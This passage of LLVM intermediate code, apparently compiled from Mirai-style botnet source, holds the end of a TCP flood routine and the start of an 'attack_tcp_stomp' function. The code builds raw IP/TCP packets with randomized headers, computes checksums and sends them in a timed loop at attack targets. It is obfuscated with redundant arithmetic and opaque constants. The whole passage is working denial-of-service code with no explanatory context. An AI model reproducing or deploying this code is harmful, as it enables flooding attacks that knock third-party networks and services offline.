  %525 = call i32 @htonl(i32 %523) #7
  %526 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %527 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %526, i32 0, i32 9
  store i32 %525, i32* %527, align 4
  br label %528

; <label>:528:                                    ; preds = %504, %482
  %529 = load i32, i32* %30, align 4
  %530 = icmp eq i32 %529, -1
  br i1 %530, label %531, label %535

; <label>:531:                                    ; preds = %528
  %532 = call i32 @rand_next()
  %533 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %534 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %533, i32 0, i32 8
  store i32 %532, i32* %534, align 4
  br label %535

; <label>:535:                                    ; preds = %531, %528
  %536 = load i16, i16* %15, align 2
  %537 = zext i16 %536 to i32
  %538 = icmp eq i32 %537, 65535
  br i1 %538, label %539, label %548

; <label>:539:                                    ; preds = %535
  %540 = call i32 @rand_next()
  %541 = xor i32 65535, -1
  %542 = xor i32 %540, %541
  %543 = and i32 %542, %540
  %544 = and i32 %540, 65535
  %545 = trunc i32 %543 to i16
  %546 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %547 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %546, i32 0, i32 3
  store i16 %545, i16* %547, align 4
  br label %548

; <label>:548:                                    ; preds = %539, %535
  %549 = load i16, i16* %18, align 2
  %550 = zext i16 %549 to i32
  %551 = icmp eq i32 %550, 65535
  br i1 %551, label %552, label %561

; <label>:552:                                    ; preds = %548
  %553 = call i32 @rand_next()
  %554 = xor i32 65535, -1
  %555 = xor i32 %553, %554
  %556 = and i32 %555, %553
  %557 = and i32 %553, 65535
  %558 = trunc i32 %556 to i16
  %559 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %560 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %559, i32 0, i32 0
  store i16 %558, i16* %560, align 4
  br label %561

; <label>:561:                                    ; preds = %552, %548
  %562 = load i16, i16* %19, align 2
  %563 = zext i16 %562 to i32
  %564 = icmp eq i32 %563, 65535
  br i1 %564, label %565, label %578

; <label>:565:                                    ; preds = %561
  %566 = call i32 @rand_next()
  %567 = xor i32 %566, -1
  %568 = xor i32 65535, -1
  %569 = xor i32 -1094238556, -1
  %570 = or i32 %567, %568
  %571 = or i32 -1094238556, %569
  %572 = xor i32 %570, -1
  %573 = and i32 %572, %571
  %574 = and i32 %566, 65535
  %575 = trunc i32 %573 to i16
  %576 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %577 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %576, i32 0, i32 1
  store i16 %575, i16* %577, align 2
  br label %578

; <label>:578:                                    ; preds = %565, %561
  %579 = load i32, i32* %20, align 4
  %580 = icmp eq i32 %579, 65535
  br i1 %580, label %581, label %585

; <label>:581:                                    ; preds = %578
  %582 = call i32 @rand_next()
  %583 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %584 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %583, i32 0, i32 2
  store i32 %582, i32* %584, align 4
  br label %585

; <label>:585:                                    ; preds = %581, %578
  %586 = load i32, i32* %21, align 4
  %587 = icmp eq i32 %586, 65535
  br i1 %587, label %588, label %592

; <label>:588:                                    ; preds = %585
  %589 = call i32 @rand_next()
  %590 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %591 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %590, i32 0, i32 3
  store i32 %589, i32* %591, align 4
  br label %592

; <label>:592:                                    ; preds = %588, %585
  %593 = load i8, i8* %29, align 1
  %594 = icmp ne i8 %593, 0
  br i1 %594, label %595, label %602

; <label>:595:                                    ; preds = %592
  %596 = load i8*, i8** %38, align 8
  %597 = load i32, i32* %28, align 4
  call void @rand_alphastr(i8* %596, i32 %597)
  %598 = load i8*, i8** %38, align 8
  %599 = load i32, i32* %28, align 4
  %600 = sext i32 %599 to i64
  %601 = getelementptr inbounds i8, i8* %598, i64 %600
  store i8 0, i8* %601, align 1
  br label %602

; <label>:602:                                    ; preds = %595, %592
  %603 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %604 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %603, i32 0, i32 7
  store i16 0, i16* %604, align 2
  %605 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %606 = bitcast %struct.iphdr* %605 to i16*
  %607 = call zeroext i16 @checksum_generic(i16* %606, i32 20)
  %608 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %609 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %608, i32 0, i32 7
  store i16 %607, i16* %609, align 2
  %610 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %611 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %610, i32 0, i32 6
  store i16 0, i16* %611, align 4
  %612 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %613 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %614 = bitcast %struct.tcphdr* %613 to i8*
  %615 = load i32, i32* %28, align 4
  %616 = sext i32 %615 to i64
  %617 = sub i64 0, %616
  %618 = sub i64 20, %617
  %619 = add i64 20, %616
  %620 = trunc i64 %618 to i16
  %621 = call zeroext i16 @htons(i16 zeroext %620) #7
  %622 = load i32, i32* %28, align 4
  %623 = sext i32 %622 to i64
  %624 = add i64 20, -6360764409684141364
  %625 = add i64 %624, %623
  %626 = sub i64 %625, -6360764409684141364
  %627 = add i64 20, %623
  %628 = trunc i64 %626 to i32
  %629 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %612, i8* %614, i16 zeroext %621, i32 %628)
  %630 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %631 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %630, i32 0, i32 6
  store i16 %629, i16* %631, align 4
  %632 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %633 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %632, i32 0, i32 1
  %634 = load i16, i16* %633, align 2
  %635 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %636 = load i32, i32* %11, align 4
  %637 = sext i32 %636 to i64
  %638 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %635, i64 %637
  %639 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %638, i32 0, i32 0
  %640 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %639, i32 0, i32 1
  store i16 %634, i16* %640, align 2
  %641 = load i32, i32* %12, align 4
  %642 = load i8*, i8** %35, align 8
  %643 = load i32, i32* %28, align 4
  %644 = sext i32 %643 to i64
  %645 = add i64 40, -1570932102926286134
  %646 = add i64 %645, %644
  %647 = sub i64 %646, -1570932102926286134
  %648 = add i64 40, %644
  %649 = bitcast %union.__CONST_SOCKADDR_ARG* %39 to %struct.sockaddr**
  %650 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %651 = load i32, i32* %11, align 4
  %652 = sext i32 %651 to i64
  %653 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %650, i64 %652
  %654 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %653, i32 0, i32 0
  %655 = bitcast %struct.sockaddr_in* %654 to %struct.sockaddr*
  store %struct.sockaddr* %655, %struct.sockaddr** %649, align 8
  %656 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %39, i32 0, i32 0
  %657 = load %struct.sockaddr*, %struct.sockaddr** %656, align 8
  %658 = call i64 @sendto(i32 %641, i8* %642, i64 %647, i32 16384, %struct.sockaddr* %657, i32 16)
  br label %659

; <label>:659:                                    ; preds = %602
  %660 = load i32, i32* %11, align 4
  %661 = add i32 %660, -1220398828
  %662 = add i32 %661, 1
  %663 = sub i32 %662, -1220398828
  %664 = add nsw i32 %660, 1
  store i32 %663, i32* %11, align 4
  br label %477

; <label>:665:                                    ; preds = %477
  %666 = call i64 @time(i64* null) #6
  %667 = load i32, i32* %31, align 4
  %668 = sext i32 %667 to i64
  %669 = icmp sgt i64 %666, %668
  br i1 %669, label %670, label %671

; <label>:670:                                    ; preds = %665
  br label %672

; <label>:671:                                    ; preds = %665
  br label %476

; <label>:672:                                    ; preds = %670, %124, %118
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_tcp_stomp(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.attack_stomp_data*, align 8
  %14 = alloca i8**, align 8
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i8, align 1
  %18 = alloca i8, align 1
  %19 = alloca i16, align 2
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca i8, align 1
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca %struct.sockaddr_in, align 4
  %31 = alloca %struct.sockaddr_in, align 4
  %32 = alloca i32, align 4
  %33 = alloca [256 x i8], align 16
  %34 = alloca i64, align 8
  %35 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %36 = alloca i32, align 4
  %37 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %38 = alloca %struct.tcphdr*, align 8
  %39 = alloca %struct.iphdr*, align 8
  %40 = alloca %struct.tcphdr*, align 8
  %41 = alloca i8*, align 8
  %42 = alloca i8*, align 8
  %43 = alloca %struct.iphdr*, align 8
  %44 = alloca %struct.tcphdr*, align 8
  %45 = alloca i8*, align 8
  %46 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %47 = load i8, i8* %7, align 1
  %48 = zext i8 %47 to i64
  %49 = call noalias i8* @calloc(i64 %48, i64 16) #6
  %50 = bitcast i8* %49 to %struct.attack_stomp_data*
  store %struct.attack_stomp_data* %50, %struct.attack_stomp_data** %13, align 8
  %51 = load i8, i8* %7, align 1
  %52 = zext i8 %51 to i64
  %53 = call noalias i8* @calloc(i64 %52, i64 8) #6
  %54 = bitcast i8* %53 to i8**
  store i8** %54, i8*** %14, align 8
  %55 = load i8, i8* %9, align 1
  %56 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %57 = call i32 @attack_get_opt_int(i8 zeroext %55, %struct.attack_option* %56, i8 zeroext 2, i32 0)
  %58 = trunc i32 %57 to i8
  store i8 %58, i8* %15, align 1
  %59 = load i8, i8* %9, align 1
  %60 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %61 = call i32 @attack_get_opt_int(i8 zeroext %59, %struct.attack_option* %60, i8 zeroext 3, i32 65535)
  %62 = trunc i32 %61 to i16
  store i16 %62, i16* %16, align 2
  %63 = load i8, i8* %9, align 1
  %64 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %65 = call i32 @attack_get_opt_int(i8 zeroext %63, %struct.attack_option* %64, i8 zeroext 4, i32 64)
  %66 = trunc i32 %65 to i8
  store i8 %66, i8* %17, align 1
  %67 = load i8, i8* %9, align 1
  %68 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %69 = call i32 @attack_get_opt_int(i8 zeroext %67, %struct.attack_option* %68, i8 zeroext 5, i32 1)
  %70 = trunc i32 %69 to i8
  store i8 %70, i8* %18, align 1
  %71 = load i8, i8* %9, align 1
  %72 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %73 = call i32 @attack_get_opt_int(i8 zeroext %71, %struct.attack_option* %72, i8 zeroext 7, i32 65535)
  %74 = trunc i32 %73 to i16
  store i16 %74, i16* %19, align 2
  %75 = load i8, i8* %9, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %77 = call i32 @attack_get_opt_int(i8 zeroext %75, %struct.attack_option* %76, i8 zeroext 10, i32 0)
  %78 = trunc i32 %77 to i8
  store i8 %78, i8* %20, align 1
  %79 = load i8, i8* %9, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %81 = call i32 @attack_get_opt_int(i8 zeroext %79, %struct.attack_option* %80, i8 zeroext 11, i32 1)
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %21, align 1
  %83 = load i8, i8* %9, align 1
  %84 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %85 = call i32 @attack_get_opt_int(i8 zeroext %83, %struct.attack_option* %84, i8 zeroext 12, i32 1)
  %86 = trunc i32 %85 to i8
  store i8 %86, i8* %22, align 1
  %87 = load i8, i8* %9, align 1
  %88 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %89 = call i32 @attack_get_opt_int(i8 zeroext %87, %struct.attack_option* %88, i8 zeroext 13, i32 0)
  %90 = trunc i32 %89 to i8
  store i8 %90, i8* %23, align 1
  %91 = load i8, i8* %9, align 1
  %92 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %93 = call i32 @attack_get_opt_int(i8 zeroext %91, %struct.attack_option* %92, i8 zeroext 14, i32 0)
  %94 = trunc i32 %93 to i8
  store i8 %94, i8* %24, align 1
  %95 = load i8, i8* %9, align 1
  %96 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %97 = call i32 @attack_get_opt_int(i8 zeroext %95, %struct.attack_option* %96, i8 zeroext 15, i32 0)
  %98 = trunc i32 %97 to i8
  store i8 %98, i8* %25, align 1
  %99 = load i8, i8* %9, align 1
  %100 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %101 = call i32 @attack_get_opt_int(i8 zeroext %99, %struct.attack_option* %100, i8 zeroext 0, i32 768)
  store i32 %101, i32* %26, align 4
  %102 = load i8, i8* %9, align 1
  %103 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %104 = call i32 @attack_get_opt_int(i8 zeroext %102, %struct.attack_option* %103, i8 zeroext 1, i32 1)
  %105 = trunc i32 %104 to i8
  store i8 %105, i8* %27, align 1
  %106 = call i64 @time(i64* null) #6
  %107 = load i32, i32* %6, align 4
  %108 = sext i32 %107 to i64
  %109 = sub i64 0, %108
  %110 = sub i64 %106, %109
  %111 = add nsw i64 %106, %108
  %112 = trunc i64 %110 to i32
  store i32 %112, i32* %28, align 4
  %113 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %113, i32* %12, align 4
  %114 = icmp eq i32 %113, -1
  br i1 %114, label %115, label %116

; <label>:115:                                    ; preds = %5
  br label %857

; <label>:116:                                    ; preds = %5
  store i32 1, i32* %11, align 4
  %117 = load i32, i32* %12, align 4
  %118 = bitcast i32* %11 to i8*
  %119 = call i32 @setsockopt(i32 %117, i32 0, i32 3, i8* %118, i32 4) #6
  %120 = icmp eq i32 %119, -1
  br i1 %120, label %121, label %124

; <label>:121:                                    ; preds = %116
  %122 = load i32, i32* %12, align 4
  %123 = call i32 @close(i32 %122)
  br label %857

; <label>:124:                                    ; preds = %116
  store i32 0, i32* %11, align 4
  br label %125

; <label>:125:                                    ; preds = %706, %124
  %126 = load i32, i32* %11, align 4
  %127 = load i8, i8* %7, align 1
  %128 = zext i8 %127 to i32
  %129 = icmp slt i32 %126, %128
  br i1 %129, label %130, label %711

; <label>:130:                                    ; preds = %125
  store i32 0, i32* %29, align 4
  br label %131

; <label>:131:                                    ; preds = %701, %687, %130
  %132 = call i32 @socket(i32 2, i32 1, i32 0) #6
  store i32 %132, i32* %29, align 4
  %133 = icmp eq i32 %132, -1
  br i1 %133, label %134, label %135

; <label>:134:                                    ; preds = %131
  br label %706

; <label>:135:                                    ; preds = %131
  %136 = load i32, i32* %29, align 4
  %137 = load i32, i32* %29, align 4
  %138 = call i32 (i32, i32, ...) @fcntl(i32 %137, i32 3, i32 0)
  %139 = and i32 %138, 2048
  %140 = xor i32 %138, 2048
  %141 = or i32 %139, %140
  %142 = or i32 %138, 2048
  %143 = call i32 (i32, i32, ...) @fcntl(i32 %136, i32 4, i32 %141)
  %144 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 0
  store i16 2, i16* %144, align 4
  %145 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %146 = load i32, i32* %11, align 4
  %147 = sext i32 %146 to i64
  %148 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %145, i64 %147
  %149 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %148, i32 0, i32 2
  %150 = load i8, i8* %149, align 4
  %151 = zext i8 %150 to i32
  %152 = icmp slt i32 %151, 32
  br i1 %152, label %153, label %176

; <label>:153:                                    ; preds = %135
  %154 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %155 = load i32, i32* %11, align 4
  %156 = sext i32 %155 to i64
  %157 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %154, i64 %156
  %158 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %157, i32 0, i32 1
  %159 = load i32, i32* %158, align 4
  %160 = call i32 @ntohl(i32 %159) #7
  %161 = call i32 @rand_next()
  %162 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %163 = load i32, i32* %11, align 4
  %164 = sext i32 %163 to i64
  %165 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %162, i64 %164
  %166 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %165, i32 0, i32 2
  %167 = load i8, i8* %166, align 4
  %168 = zext i8 %167 to i32
  %169 = lshr i32 %161, %168
  %170 = sub i32 0, %169
  %171 = sub i32 %160, %170
  %172 = add i32 %160, %169
  %173 = call i32 @htonl(i32 %171) #7
  %174 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 2
  %175 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %174, i32 0, i32 0
  store i32 %173, i32* %175, align 4
  br label %185

; <label>:176:                                    ; preds = %135
  %177 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %178 = load i32, i32* %11, align 4
  %179 = sext i32 %178 to i64
  %180 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %177, i64 %179
  %181 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %180, i32 0, i32 1
  %182 = load i32, i32* %181, align 4
  %183 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 2
  %184 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %183, i32 0, i32 0
  store i32 %182, i32* %184, align 4
  br label %185

; <label>:185:                                    ; preds = %176, %153
  %186 = load i16, i16* %19, align 2
  %187 = zext i16 %186 to i32
  %188 = icmp eq i32 %187, 65535
  br i1 %188, label %189, label %201

; <label>:189:                                    ; preds = %185
  %190 = call i32 @rand_next()
  %191 = xor i32 %190, -1
  %192 = xor i32 65535, -1
  %193 = xor i32 -776480595, -1
  %194 = or i32 %191, %192
  %195 = or i32 -776480595, %193
  %196 = xor i32 %194, -1
  %197 = and i32 %196, %195
  %198 = and i32 %190, 65535
  %199 = trunc i32 %197 to i16
  %200 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 1
  store i16 %199, i16* %200, align 2
  br label %205

; <label>:201:                                    ; preds = %185
  %202 = load i16, i16* %19, align 2
  %203 = call zeroext i16 @htons(i16 zeroext %202) #7
  %204 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 1
  store i16 %203, i16* %204, align 2
  br label %205

; <label>:205:                                    ; preds = %201, %189
  %206 = load i32, i32* %29, align 4
  %207 = bitcast %union.__CONST_SOCKADDR_ARG* %35 to %struct.sockaddr**
  %208 = bitcast %struct.sockaddr_in* %30 to %struct.sockaddr*
  store %struct.sockaddr* %208, %struct.sockaddr** %207, align 8
  %209 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %35, i32 0, i32 0
  %210 = load %struct.sockaddr*, %struct.sockaddr** %209, align 8
  %211 = call i32 @connect(i32 %206, %struct.sockaddr* %210, i32 16)
  %212 = call i64 @time(i64* null) #6
  store i64 %212, i64* %34, align 8
  br label %213

; <label>:213:                                    ; preds = %704, %205
  store i32 0, i32* %36, align 4
  store i32 16, i32* %32, align 4
  %214 = load i32, i32* %12, align 4
  %215 = getelementptr inbounds [256 x i8], [256 x i8]* %33, i32 0, i32 0
  %216 = bitcast %union.__CONST_SOCKADDR_ARG* %37 to %struct.sockaddr**
  %217 = bitcast %struct.sockaddr_in* %31 to %struct.sockaddr*
  store %struct.sockaddr* %217, %struct.sockaddr** %216, align 8
  %218 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %37, i32 0, i32 0
  %219 = load %struct.sockaddr*, %struct.sockaddr** %218, align 8
  %220 = call i64 @recvfrom(i32 %214, i8* %215, i64 256, i32 16384, %struct.sockaddr* %219, i32* %32)
  %221 = trunc i64 %220 to i32
  store i32 %221, i32* %36, align 4
  %222 = load i32, i32* %36, align 4
  %223 = icmp eq i32 %222, -1
  br i1 %223, label %224, label %225

; <label>:224:                                    ; preds = %213
  br label %857

; <label>:225:                                    ; preds = %213
  %226 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %31, i32 0, i32 2
  %227 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %226, i32 0, i32 0
  %228 = load i32, i32* %227, align 4
  %229 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 2
  %230 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %229, i32 0, i32 0
  %231 = load i32, i32* %230, align 4
  %232 = icmp eq i32 %228, %231
  br i1 %232, label %233, label %693

; <label>:233:                                    ; preds = %225
  %234 = load i32, i32* %36, align 4
  %235 = sext i32 %234 to i64
  %236 = icmp ugt i64 %235, 40
  br i1 %236, label %237, label %693

; <label>:237:                                    ; preds = %233
  %238 = getelementptr inbounds [256 x i8], [256 x i8]* %33, i32 0, i32 0
  %239 = getelementptr inbounds i8, i8* %238, i64 20
  %240 = bitcast i8* %239 to %struct.tcphdr*
  store %struct.tcphdr* %240, %struct.tcphdr** %38, align 8
  %241 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %242 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %241, i32 0, i32 0
  %243 = load i16, i16* %242, align 4
  %244 = zext i16 %243 to i32
  %245 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 1
  %246 = load i16, i16* %245, align 2
  %247 = zext i16 %246 to i32
  %248 = icmp eq i32 %244, %247
  br i1 %248, label %249, label %692

; <label>:249:                                    ; preds = %237
  %250 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %251 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %250, i32 0, i32 4
  %252 = load i16, i16* %251, align 4
  %253 = lshr i16 %252, 9
  %254 = xor i16 1, -1
  %255 = xor i16 %253, %254
  %256 = and i16 %255, %253
  %257 = and i16 %253, 1
  %258 = zext i16 %256 to i32
  %259 = icmp ne i32 %258, 0
  br i1 %259, label %260, label %665

; <label>:260:                                    ; preds = %249
  %261 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %262 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %261, i32 0, i32 4
  %263 = load i16, i16* %262, align 4
  %264 = lshr i16 %263, 12
  %265 = xor i16 1, -1
  %266 = xor i16 %264, %265
  %267 = and i16 %266, %264
  %268 = and i16 %264, 1
  %269 = zext i16 %267 to i32
  %270 = icmp ne i32 %269, 0
  br i1 %270, label %271, label %665

; <label>:271:                                    ; preds = %260
  %272 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 2
  %273 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %272, i32 0, i32 0
  %274 = load i32, i32* %273, align 4
  %275 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %276 = load i32, i32* %11, align 4
  %277 = sext i32 %276 to i64
  %278 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %275, i64 %277
  %279 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %278, i32 0, i32 0
  store i32 %274, i32* %279, align 4
  %280 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %281 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %280, i32 0, i32 2
  %282 = load i32, i32* %281, align 4
  %283 = call i32 @ntohl(i32 %282) #7
  %284 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %285 = load i32, i32* %11, align 4
  %286 = sext i32 %285 to i64
  %287 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %284, i64 %286
  %288 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %287, i32 0, i32 1
  store i32 %283, i32* %288, align 4
  %289 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %290 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %289, i32 0, i32 3
  %291 = load i32, i32* %290, align 4
  %292 = call i32 @ntohl(i32 %291) #7
  %293 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %294 = load i32, i32* %11, align 4
  %295 = sext i32 %294 to i64
  %296 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %293, i64 %295
  %297 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %296, i32 0, i32 2
  store i32 %292, i32* %297, align 4
  %298 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %299 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %298, i32 0, i32 1
  %300 = load i16, i16* %299, align 2
  %301 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %302 = load i32, i32* %11, align 4
  %303 = sext i32 %302 to i64
  %304 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %301, i64 %303
  %305 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %304, i32 0, i32 3
  store i16 %300, i16* %305, align 4
  %306 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 1
  %307 = load i16, i16* %306, align 2
  %308 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %309 = load i32, i32* %11, align 4
  %310 = sext i32 %309 to i64
  %311 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %308, i64 %310
  %312 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %311, i32 0, i32 4
  store i16 %307, i16* %312, align 2
  %313 = load i32, i32* %26, align 4
  %314 = sext i32 %313 to i64
  %315 = sub i64 0, 40
  %316 = sub i64 0, %314
  %317 = add i64 %315, %316
  %318 = sub i64 0, %317
  %319 = add i64 40, %314
  %320 = call noalias i8* @malloc(i64 %318) #6
  %321 = load i8**, i8*** %14, align 8
  %322 = load i32, i32* %11, align 4
  %323 = sext i32 %322 to i64
  %324 = getelementptr inbounds i8*, i8** %321, i64 %323
  store i8* %320, i8** %324, align 8
  %325 = load i8**, i8*** %14, align 8
  %326 = load i32, i32* %11, align 4
  %327 = sext i32 %326 to i64
  %328 = getelementptr inbounds i8*, i8** %325, i64 %327
  %329 = load i8*, i8** %328, align 8
  %330 = bitcast i8* %329 to %struct.iphdr*
  store %struct.iphdr* %330, %struct.iphdr** %39, align 8
  %331 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %332 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %331, i64 1
  %333 = bitcast %struct.iphdr* %332 to %struct.tcphdr*
  store %struct.tcphdr* %333, %struct.tcphdr** %40, align 8
  %334 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %335 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %334, i64 1
  %336 = bitcast %struct.tcphdr* %335 to i8*
  store i8* %336, i8** %41, align 8
  %337 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %338 = bitcast %struct.iphdr* %337 to i8*
  %339 = load i8, i8* %338, align 4
  %340 = xor i8 %339, -1
  %341 = xor i8 15, -1
  %342 = xor i8 55, -1
  %343 = or i8 %340, %341
  %344 = or i8 55, %342
  %345 = xor i8 %343, -1
  %346 = and i8 %345, %344
  %347 = and i8 %339, 15
  %348 = xor i8 %346, -1
  %349 = xor i8 64, -1
  %350 = xor i8 -41, -1
  %351 = and i8 %348, -41
  %352 = and i8 %346, %350
  %353 = and i8 %349, -41
  %354 = and i8 64, %350
  %355 = or i8 %351, %352
  %356 = or i8 %353, %354
  %357 = xor i8 %355, %356
  %358 = or i8 %348, %349
  %359 = xor i8 %358, -1
  %360 = or i8 -41, %350
  %361 = and i8 %359, %360
  %362 = or i8 %357, %361
  %363 = or i8 %346, 64
  store i8 %362, i8* %338, align 4
  %364 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %365 = bitcast %struct.iphdr* %364 to i8*
  %366 = load i8, i8* %365, align 4
  %367 = xor i8 -16, -1
  %368 = xor i8 %366, %367
  %369 = and i8 %368, %366
  %370 = and i8 %366, -16
  %371 = and i8 %369, 5
  %372 = xor i8 %369, 5
  %373 = or i8 %371, %372
  %374 = or i8 %369, 5
  store i8 %373, i8* %365, align 4
  %375 = load i8, i8* %15, align 1
  %376 = load %struct.iphdr*, %struct.iphdr** %39, align 8
